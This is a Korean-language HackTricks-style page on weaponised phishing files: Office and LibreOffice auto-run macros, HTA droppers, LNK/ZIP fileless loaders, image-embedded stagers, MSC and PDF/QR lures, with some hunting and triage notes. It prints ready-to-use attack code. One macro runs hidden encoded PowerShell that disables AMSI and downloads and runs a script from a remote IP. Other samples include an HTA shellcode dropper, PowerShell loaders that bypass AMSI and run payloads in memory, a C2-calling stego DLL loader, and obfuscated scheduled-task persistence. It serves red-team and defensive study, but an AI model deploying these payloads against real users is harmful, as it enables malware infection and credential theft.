# 피싱 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터의 유효성을 검사합니다. 데이터 구조를 식별하고 OfficeOpenXML 표준과 대조하는 방식으로 유효성을 검사합니다. 데이터 구조를 식별하는 과정에서 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 하지만 파일 확장자를 변경해도 매크로 실행 기능을 유지한 채 파일 이름을 바꿀 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일의 이름을 RTF로 바꾸면 Microsoft Word에서 해당 파일을 처리하고 매크로를 실행할 수 있습니다.\
같은 내부 구조와 메커니즘은 Microsoft Office 제품군의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령어를 사용하면 일부 Office 프로그램에서 실행되는 확장자를 확인할 수 있습니다:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX 파일은 매크로가 포함된 원격 템플릿(File –Options –Add-ins –Manage: Templates –Go)을 참조하여 매크로를 “실행”할 수도 있습니다.

### 외부 이미지 로드

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - 외부 이미지 로드: 다음으로 이동: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

문서를 작성하는 대신 전달받은 문서를 분석하려면 [VBA 매크로 분석: 정크 코드 및 UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms)를 참조하세요.

### 매크로 백도어

매크로를 사용해 문서에서 임의의 코드를 실행할 수 있습니다.

#### 자동 로드 함수

널리 사용될수록 AV가 탐지할 가능성이 높아집니다.

- AutoOpen()
- Document_Open()

#### 매크로 코드 예시

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 메타데이터 수동 제거

**파일 > 정보 > 문서 검사 > 문서 검사**로 이동하면 문서 검사기가 열립니다. **검사**를 클릭한 다음 **문서 속성 및 개인 정보** 옆의 **모두 제거**를 클릭합니다.

#### Doc 확장자

작업이 끝나면 **파일 형식** 드롭다운에서 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**으로 변경합니다.\
**`.docx`**에는 매크로를 저장할 수 없고, 매크로 사용 **`.docm`** 확장자는 **낙인**이 찍혀 있기 때문입니다(예: 썸네일 아이콘에 커다란 `!`가 표시되고 일부 웹/이메일 게이트웨이는 파일을 전부 차단함). 따라서 이 **레거시 `.doc` 확장자가 가장 나은 절충안**입니다.

#### 악성 매크로 생성기

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 매크로 (Basic)

LibreOffice Writer 문서에는 Basic 매크로를 포함할 수 있으며, 매크로를 **문서 열기** 이벤트에 연결하면 파일을 열 때 자동으로 실행되도록 설정할 수 있습니다(Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 간단한 reverse shell 매크로는 다음과 같습니다:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

문자열 안의 두 개의 따옴표(`""`)에 유의하세요. LibreOffice Basic은 리터럴 따옴표를 이스케이프할 때 이를 사용하므로, `...==""")`로 끝나는 payload에서는 내부 명령과 Shell 인수의 괄호가 모두 균형을 이룹니다.

전달 팁:

- `.odt`로 저장하고, 문서 이벤트에 매크로를 연결해 문서를 열자마자 실행되도록 하세요.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용하세요(`@`가 있어야 파일 이름 문자열이 아니라 파일 바이트가 첨부 파일로 전송됩니다). 이는 검증 없이 임의의 `RCPT TO` 수신자를 허용하는 SMTP 서버를 악용할 때 중요합니다.

## HTA 파일

HTA는 **HTML과 스크립팅 언어(VBScript 및 JScript 등)를 결합한** Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저 보안 모델의 제약 없이 "완전히 신뢰된" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 보통 **Internet Explorer**와 함께 **설치**되므로 **`mshta`는 IE에 의존합니다**. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML 이메일의 가짜 첨부 파일 카드

HTML 이메일은 실제 첨부 파일을 포함하는 대신 공급자의 기본 첨부 파일 미리보기 카드를 흉내 낼 수 있습니다. Talos는 Base64로 인코딩된 인라인 PNG MIME 파트 4개로 재구성한 Gmail 카드를 관찰했습니다. 시각적 요소 전체가 하나의 앵커로 감싸져 있었고, `?m=<target-id>`의 수신자 값으로 수신자별 추적이 가능했습니다. 링크는 `http://`나 `https://` 대신 `//`로 시작했습니다. 브라우저는 이 프로토콜 상대 형식을 해석하지만, 정규화된 URL만 찾는 URL 추출기는 이를 놓칠 수 있습니다.<sup>[[11]](#references)</sup>

분석할 때는 렌더링된 첨부 파일 목록을 신뢰하지 말고 원본 MIME을 확인하세요. 인라인 이미지 파트가 어떻게 시각적 카드를 구성하는지 재구성하고, 카드를 감싸는 앵커를 식별한 뒤 URL을 추출하기 전에 프로토콜 상대 `href` 값을 정규화하세요.<sup>[[11]](#references)</sup>

Envelope/header 발신자 스푸핑 및 DMARC 정렬 테스트는 [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)를 참고하세요.

## NTLM Authentication 강제하기

**"원격으로" NTLM Authentication을 강제하는** 방법은 여러 가지가 있습니다. 예를 들어, 사용자가 열어볼 이메일이나 HTML에 **보이지 않는 이미지**를 넣을 수 있습니다(HTTP MitM도 가능할까요?). 또는 **폴더를 여는 것만으로도 Authentication을 트리거하는** 파일 **주소**를 피해자에게 보낼 수 있습니다.

**이러한 아이디어와 그 외의 내용은 다음 페이지에서 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 Authentication을 훔치는 것뿐 아니라 **NTLM relay 공격도 수행할 수 있다**는 점을 잊지 마세요.

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## `ftp.exe`를 이용한 LNK 로컬 명령 스테이징

바로 가기는 이미지 확장자로 위장한 텍스트 명령 파일을 사용해 `ftp.exe -s:icon.ico`를 시작할 수 있습니다.<sup>[[12]](#references)</sup> `-s:` 옵션은 로컬 FTP 명령을 읽으며, Windows 8 이상에서는 해당 파일을 UTF-8로 인코딩해야 합니다.<sup>[[13]](#references)</sup> `!`로 시작하는 줄은 해당 명령을 FTP 서버에 보내지 않고 `cmd /c`를 통해 로컬에서 실행합니다. 이 로컬 실행 경로에는 FTP 연결이 필요하지 않습니다.<sup>[[14]](#references)</sup> 보고된 공격 체인에서 FTP 스크립트는 두 번째 명령 파일을 호출했습니다. `!` 줄 전체가 중요합니다. `!more res.ico`만 있으면 파일을 표시하지만, 여기에 `cmd`로 파이프를 연결하면 파일 내용이 실행됩니다.<sup>[[12]](#references)[[14]](#references)</sup>

같은 공격 체인에서는 업데이트할 때마다 새 실행 파일을 설치하는 대신 반복 실행되는 작업이 쓰기 가능한 명령 파일을 다시 읽도록 했습니다. 작업 동작은 `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`였으며, 해당 파일에는 실행 시 명령을 가져오는 명령이 들어 있었습니다. 관련 변형에서는 예약된 작업이 실행되기 전에 대체 명령 파일을 다운로드했습니다. 작업이 실행될 때 파일이 존재하고 읽을 수 있어야 합니다. `conhost`는 작업에 설정된 사용자 토큰보다 높은 권한으로 작업을 실행하지 않습니다.<sup>[[12]](#references)</sup> 작업 메커니즘은 [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md)을 참고하세요.

## 숨겨진 MSI와 미끼 문서가 포함된 VHDX 바로 가기

마운트된 VHDX는 눈에 보이는 LNK를 표시하면서 같은 볼륨 안의 MSI와 미끼 스프레드시트를 숨길 수 있습니다. 보고된 공격 체인에서 LNK는 `cmd.exe /c Visa_Details.msi & Attachment-2.xls`를 사용했습니다. `&` 구분자는 설치 프로그램 명령이 실패하더라도 미끼 문서를 엽니다. 문서가 열렸다고 해서 설치가 성공했다는 뜻은 아닙니다. 이는 [MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md)의 전달 방식 변형이지, 그 자체로 MSI 권한 상승을 의미하지는 않습니다.<sup>[[12]](#references)</sup>

이 MSI에서 `CustomAction.Type` **194**는 `Binary` 테이블에 저장된 EXE(**2**)와 반환 코드 무시(**64**) 및 비동기(**128**) 플래그를 결합합니다. **64 + 128** 조합에서는 Windows Installer가 EXE 종료를 기다리지 않습니다. 128 플래그만 있으면 시퀀스가 끝날 때까지 기다립니다.<sup>[[15]](#references)[[16]](#references)</sup> 내장된 EXE가 실행되었다고 판단하기 전에 해당 동작의 `Source`를 `Binary` 테이블과 대조하고 `InstallExecuteSequence`에서의 위치를 확인하세요.<sup>[[12]](#references)[[15]](#references)</sup> [WebDAV UNC 경로로 원격 MSI를 전달할 수](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path) 있지만, 이는 다른 진입점입니다.

## LNK 로더 + ZIP 내장 페이로드(파일리스 공격 체인)

효과적인 캠페인은 합법적인 미끼 문서 두 개(PDF/DOCX)와 악성 .lnk가 들어 있는 ZIP을 전달합니다. 핵심은 실제 PowerShell 로더가 고유한 마커 뒤의 ZIP 원시 바이트 안에 저장되어 있고, .lnk가 이를 추출해 메모리에서 실행한다는 점입니다.<sup>[[2]](#references)</sup>

일반적인 .lnk PowerShell 한 줄 명령 실행 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 현재 작업 디렉터리의 상위 경로 등 일반적인 경로에서 원본 ZIP을 찾습니다.
2) ZIP 바이트를 읽고 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 뒤의 모든 내용이 내장된 PowerShell 페이로드입니다.
3) ZIP을 %ProgramData%에 복사해 그곳에 압축을 풀고, 정상 파일처럼 보이도록 미끼 .docx를 엽니다.
4) 현재 프로세스에서 AMSI를 우회합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계를 난독화 해제합니다(예: 모든 # 문자를 제거). 그런 다음 메모리에서 실행합니다.

내장된 단계를 추출하고 실행하는 PowerShell 기본 예제:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

메모
- 전달 과정에서 평판이 좋은 PaaS 하위 도메인(예: *.herokuapp.com)을 악용하는 경우가 많으며, payload 제공을 제한할 수 있습니다(IP/UA에 따라 무해한 ZIP 제공).
- 다음 단계에서는 base64/XOR shellcode를 복호화한 뒤 Reflection.Emit + VirtualAlloc을 통해 실행하여 디스크 흔적을 최소화하는 경우가 많습니다.

같은 체인에서 사용되는 Persistence
- Microsoft Web Browser 컨트롤의 COM TypeLib hijacking을 통해 IE/Explorer 또는 해당 컨트롤을 포함하는 앱이 payload를 자동으로 다시 실행하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 명령은 여기에서 확인하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 끝에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- 상위 폴더/사용자 폴더를 열거해 ZIP 파일을 찾고 미끼 문서를 여는 .lnk 파일.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI 변조.
- 신뢰할 수 있는 PaaS 도메인에서 호스팅된 링크로 끝나는 장시간 진행된 비즈니스 이메일 스레드.

## LNK 미끼 우선 staging → scheduled-task persistence → 신뢰할 수 있는 CPL side-loading

반복적으로 관찰되는 또 다른 패턴은 **문서를 가장한 `.lnk`**가 무해한 미끼 파일을 즉시 열면서 실제 체인을 백그라운드에서 준비하는 방식입니다.<sup>[[3]](#references)</sup>

관찰된 workflow:
1. 바로가기는 **PDF인 것처럼 가장**하고 `conhost.exe` 또는 유사한 proxy를 사용해 난독화된 PowerShell downloader를 실행합니다.
2. PowerShell은 `iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`처럼 토큰을 분리하여 `iwr`, `gci`, `ren`, `cpi`, `schtasks`를 찾는 단순한 탐지를 회피합니다.
3. Stager는 **미끼 문서를 먼저 다운로드**해 피해자에게 열어 준 다음, 백그라운드에서 악성 파일을 다시 구성합니다.
4. Payload는 **junk extension**을 사용해 저장한 뒤 filler 문자를 제거하며 이름을 바꿀 수 있습니다. 이로 인해 `.exe` / `.cpl` 파일이 나타나는 시점을 늦출 수 있습니다.
5. 사용자 쓰기 권한이 있는 경로의 신뢰할 수 있는 host binary를 실행하는 **분 단위 scheduled task**로 Persistence를 설정합니다.

이 패턴에서 확인할 최소한의 단서:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

유용한 스테이징 레이아웃은 다음과 같습니다.
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 단계가 은밀한 이유

Rapid7 사례 연구에서 예약된 작업은 **`Fondue.exe`**를 `C:\Users\Public\`에서 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 같은 디렉터리에 스테이징되어 있고 **`RunFODW`**를 내보냈기 때문에, 신뢰된 Microsoft 바이너리는 정상적인 시스템 사본 대신 공격자의 CPL을 사이드로딩했습니다.

그 후 CPL은 다음 작업을 수행했습니다.
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽음
- **Windows CNG / `bcrypt.dll`**을 통해 복호화함
- 실행 가능한 메모리를 할당하고 복호화된 shellcode를 복사함
- **`EnumUILanguagesW`**의 콜백으로 shellcode 포인터를 전달해 간접적으로 실행함

마지막 단계는 별도로 헌팅할 가치가 있습니다. 악성코드는 `((void(*)())buf)()`와 같이 직접 점프하는 대신, 실행을 넘기기 위해 **콜백을 받는 정상적인 WinAPI**를 악용하는 경우가 많습니다.

이 캠페인에서 복호화된 페이로드는 **Donut** shellcode였으며, 이 shellcode는 최종 PE를 메모리에 완전히 매핑한 다음 실행을 넘기기 전에 현재 프로세스에서 **AMSI/WLDP/ETW**를 패치했습니다. 사이드로딩과 메모리 상주 후처리에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실전 헌팅 기준:
- `.lnk`가 `powershell.exe` 또는 `conhost.exe`를 실행한 뒤 눈에 띄는 미끼 문서를 표시함.
- `C:\Users\Public\`에 짧은 시간 동안 다운로드한 뒤, 의미 없는 확장자에서 즉시 이름을 변경함.
- `GoogleErrorReport`처럼 평범한 이름의 예약된 작업이 **사용자 쓰기 가능 디렉터리**에서 실행됨.
- 신뢰된 바이너리가 동일한 비시스템 디렉터리에서 **`.cpl` / `.dll`** 파일을 로드함.
- `C:\Windows\Tasks\`에 Base64 텍스트 blob을 기록한 뒤 사이드로딩된 모듈이 이를 읽음.

## 이미지에 구분자를 사용해 숨긴 페이로드 (PowerShell stager)

최근의 loader 체인은 난독화된 JavaScript/VBS를 전달합니다. 이 스크립트는 Base64 PowerShell stager를 디코딩해 실행합니다. 해당 stager는 이미지(주로 GIF)를 다운로드합니다. 이미지에는 고유한 시작/끝 구분자 사이에 일반 텍스트 형태로 숨겨진 Base64 인코딩 .NET DLL이 들어 있습니다. 스크립트는 이러한 구분자(실제 사례에서 확인된 예: «<<sudo_png>> … <<sudo_odt>>>»)를 검색하고, 그 사이의 텍스트를 추출해 Base64를 바이트로 디코딩한 다음, 어셈블리를 메모리에 로드하고 C2 URL을 전달해 알려진 진입 메서드를 호출합니다.<sup>[[5]](#references)</sup>

워크플로
- 1단계: JS/VBS 압축 파일 dropper → 내장된 Base64 디코딩 → `-nop -w hidden -ep bypass` 옵션으로 PowerShell stager 실행.
- 2단계: PowerShell stager → 이미지 다운로드, 구분자로 표시된 Base64 추출, .NET DLL을 메모리에 로드하고 메서드(예: VAI)를 호출하면서 C2 URL과 옵션 전달.
- 3단계: Loader가 최종 페이로드를 가져와 일반적으로 process hollowing을 통해 신뢰된 바이너리(주로 MSBuild.exe)에 삽입함.<sup>[[7]](#references)[[8]](#references)</sup> process hollowing 및 신뢰된 유틸리티를 통한 프록시 실행에 대한 자세한 내용은 여기에서 확인하세요.

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

이미지에서 DLL을 추출하고 메모리에서 .NET 메서드를 호출하는 PowerShell 예제:

<details>
<summary>PowerShell stego 페이로드 추출기 및 로더</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

메모
- 이는 ATT&CK T1027.003 (스테가노그래피/마커 숨기기)입니다.<sup>[[6]](#references)</sup> 마커는 캠페인마다 다릅니다.
- 어셈블리를 로드하기 전에 AMSI/ETW bypass와 문자열 난독화 해제가 흔히 적용됩니다.
- 헌팅: 다운로드한 이미지에서 알려진 구분자를 검색하고, 이미지에 접근해 Base64 blob을 즉시 디코딩하는 PowerShell을 식별합니다.

스테고 도구 및 carving 기법도 참조하세요:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS dropper → Base64 PowerShell staging

반복해서 관찰되는 초기 단계는 아카이브에 담겨 전달되는 작고 난독화가 심한 `.js` 또는 `.vbs` 파일입니다. 이 파일의 유일한 목적은 내장된 Base64 문자열을 디코딩하고 `-nop -w hidden -ep bypass` 옵션으로 PowerShell을 실행해 HTTPS를 통해 다음 단계를 준비하는 것입니다.<sup>[[5]](#references)</sup>

기본 로직(추상화):
- 자체 파일 내용 읽기
- 쓰레기 문자열 사이에서 Base64 blob 찾기
- ASCII PowerShell로 디코딩
- `wscript.exe`/`cscript.exe`로 `powershell.exe` 호출해 실행

헌팅 단서
- 명령줄에 `-enc`/`FromBase64String`이 포함된 `powershell.exe`를 실행하는 아카이브 내 JS/VBS 첨부 파일.
- 사용자 임시 경로에서 `powershell.exe -nop -w hidden`을 실행하는 `wscript.exe`.

## 실행 컨테이너로 사용되는 MSC 문서 (GrimResource)

Microsoft Management Console 파일(`.msc`)은 보통 `mmc.exe`로 여는 XML 콘솔 정의 파일입니다. **GrimResource**는 오래된 XSS 취약점이 포함된 `apds.dll` 리소스를 가리키는 `StringTable` 참조를 악용합니다. 따라서 사용자가 조작된 콘솔을 열면 `mmc.exe` 내부에서 JavaScript가 실행됩니다. 관찰된 샘플은 `transformNode` 기반 난독화와 **DotNetToJScript**를 결합해, 일반적인 Office 매크로 경로를 사용하지 않고 .NET payload를 인스턴스화했습니다.<sup>[[9]](#references)</sup>

정적 분류 시 신뢰할 수 없는 MSC 파일은 텍스트로 취급하고 **더블클릭하지 마세요**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivot은 `mmc.exe`가 CLR 또는 script 구성 요소를 로드하거나, 네트워크 연결을 생성하거나, `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` 또는 예상치 못한 실행 파일을 시작하는 경우입니다. 이 형식은 정상적으로 사용되므로, 모든 MSC를 차단하는 대신 **출처 + 의심스러운 XML/script 콘텐츠 + `mmc.exe` 동작**을 연관 지어 탐지해야 합니다.<sup>[[9]](#references)</sup>

## PDF/QR 리디렉터와 페이로드 게이팅

PDF는 유용하게 쓰이기 위해 exploit이 필요하지 않습니다. 최근 캠페인은 무해해 보이는 문서에 **QR 코드 또는 일반 링크**를 넣고, 브라우저 세션을 메일 보안 제어에서 벗어나게 한 뒤, 수신자 주소에 맞춰 목적지를 개인화합니다. Microsoft는 2025년에 QR URL이 수신자마다 고유하며 RaccoonO365 자격 증명 탈취 인프라로 연결되는 PDF를 문서화했습니다. 이와 병행된 공격 체인은 IP/환경 게이팅을 사용해 선택된 방문자에게는 JavaScript/MSI 경로를 제공하고, 스캐너나 허용되지 않은 클라이언트에는 무해한 PDF를 제공했습니다.<sup>[[10]](#references)</sup>

PDF 액션과 렌더링된 QR 코드 모두를 분류하세요. QR 코드는 추출 가능한 이미지로 저장되지 않고 벡터로 그려질 수 있으므로, 내장 이미지를 추출하는 것뿐 아니라 모든 페이지를 래스터화하세요:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

디코딩된 목적지와 리디렉션을 격리된 분석 시스템에서 인증 없이 확인하세요. 유용한 헌팅 특징으로는 메일 본문이 거의 비어 있고 QR 코드만 포함된 PDF, 쿼리 매개변수에 삽입된 수신자 이메일, 신뢰할 만한 호스팅 서비스를 여러 차례 거치는 리디렉션, IP, 지리적 위치, 쿠키, 리퍼러 또는 사용자 에이전트에 따라 달라지는 응답 콘텐츠가 있습니다. 단일 샌드박스 요청은 미끼 콘텐츠만 받을 수 있으므로, 제어된 프로필로 요청을 비교하세요.<sup>[[10]](#references)</sup>

## NTLM 해시 탈취에 사용할 Windows 파일

**NTLM 자격 증명을 탈취할 위치** 페이지를 확인하세요:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice 매크로 → IIS 웹셸 → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine 캠페인: 미국 기업을 표적으로 한 정교한 피싱 공격](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 중국 테마 로더 체인을 통한 Dropping Elephant의 전술 추적](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 새로운 COM 지속성 기법 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI 로더, 다양한 인포스틸러 전달](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – 스테가노그래피 (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – 프로세스 홀로잉 (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 신뢰할 수 있는 개발자 유틸리티 프록시 실행: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: 초기 침투 및 회피를 위한 Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 위협 행위자, 세금 신고 시즌을 이용해 세금 관련 피싱 캠페인 전개](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 전달 체인 및 Antino 백도어](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER, PapRAT으로 무기고 확장](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - ftp 명령](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - 사용자 지정 작업 유형 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
